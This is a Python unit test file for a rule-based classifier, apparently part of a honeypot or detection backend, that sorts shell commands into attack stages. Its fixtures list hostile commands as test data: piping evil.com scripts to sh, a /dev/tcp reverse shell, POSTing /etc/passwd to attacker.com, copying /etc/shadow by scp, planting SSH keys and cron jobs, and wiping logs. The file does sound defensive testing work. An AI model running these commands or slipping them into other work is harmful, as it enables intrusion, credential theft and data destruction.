"""
Unit tests for RuleClassifier service across all 10 intent categories.
"""

from datetime import datetime, timezone
import pytest

from backend.app.models.events import NormalizedEvent
from backend.app.models.intent import AttackStage, IntentCategory
from backend.app.services.rule_classifier import RuleClassifier


@pytest.fixture
def classifier():
    return RuleClassifier()


def make_event(command: str = None, event_type: str = "command_input") -> NormalizedEvent:
    return NormalizedEvent(
        event_id="test_ev",
        timestamp=datetime.now(timezone.utc),
        session_id="test_session",
        event_type=event_type,
        command=command
    )


def test_reconnaissance_commands(classifier):
    recon_commands = ["whoami", "uname -a", "id", "hostname", "cat /etc/issue", "arch", "lscpu", "uptime"]
    for cmd in recon_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.RECONNAISSANCE, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.RECONNAISSANCE
        assert res.confidence >= 0.85
        assert len(res.rule_matches) > 0


def test_discovery_commands(classifier):
    disc_commands = ["ls -la /", "cat /etc/passwd", "netstat -tuln", "ps aux", "find / -name '*.txt'", "ip a", "ifconfig"]
    for cmd in disc_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.DISCOVERY, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.DISCOVERY
        assert res.confidence >= 0.85


def test_credential_access(classifier):
    # Event type login_failed
    ev_fail = make_event(event_type="login_failed")
    res_fail = classifier.classify(ev_fail)
    assert res_fail.intent == IntentCategory.CREDENTIAL_ACCESS
    assert res_fail.attack_stage == AttackStage.CREDENTIAL_ACCESS

    # Shadow file access
    ev_shadow = make_event(command="cat /etc/shadow")
    res_shadow = classifier.classify(ev_shadow)
    assert res_shadow.intent == IntentCategory.CREDENTIAL_ACCESS

    # SSH key access
    ev_key = make_event(command="cat ~/.ssh/id_rsa")
    res_key = classifier.classify(ev_key)
    assert res_key.intent == IntentCategory.CREDENTIAL_ACCESS


def test_privilege_escalation(classifier):
    priv_commands = ["sudo su -", "su root", "sudo -i", "find / -perm -4000", "chmod +s /tmp/sh", "sudo -l"]
    for cmd in priv_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.PRIVILEGE_ESCALATION, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.PRIVILEGE_ESCALATION


def test_execution(classifier):
    exec_commands = [
        "curl http://evil.com/drop.sh | sh",
        "wget http://evil.com/miner.sh -O /tmp/miner.sh; chmod +x /tmp/miner.sh",
        "python3 -c 'import socket,os,subprocess; s=socket.socket()'",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    ]
    for cmd in exec_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.EXECUTION, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.EXECUTION


def test_persistence(classifier):
    persist_commands = [
        "crontab -e",
        "echo '* * * * * root /tmp/bot' >> /etc/crontab",
        "echo 'ssh-rsa AAAAB3... root@attacker' >> ~/.ssh/authorized_keys",
        "useradd -m -G sudo hacker"
    ]
    for cmd in persist_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.PERSISTENCE, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.PERSISTENCE


def test_exfiltration(classifier):
    exfil_commands = [
        "tar -czf /tmp/data.tar.gz /etc /var/log",
        "curl -X POST -d @/etc/passwd http://attacker.com/upload",
        "scp /etc/shadow root@10.0.0.1:/loot/"
    ]
    for cmd in exfil_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.EXFILTRATION, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.EXFILTRATION


def test_cleanup(classifier):
    clean_commands = ["history -c", "rm -rf /var/log/*", "unset HISTFILE", "rm ~/.bash_history"]
    for cmd in clean_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.CLEANUP, f"Failed for cmd: {cmd}"
        assert res.attack_stage == AttackStage.CLEANUP


def test_exploitation(classifier):
    exploit_commands = ["() { :;}; /bin/bash -c 'echo vulnerable'", "CVE-2021-4034 exploit"]
    for cmd in exploit_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.EXPLOITATION, f"Failed for cmd: {cmd}"


def test_unknown_and_other_commands(classifier):
    other_commands = ["cd /tmp", "pwd", "clear", "echo hello"]
    for cmd in other_commands:
        ev = make_event(command=cmd)
        res = classifier.classify(ev)
        assert res.intent == IntentCategory.OTHER
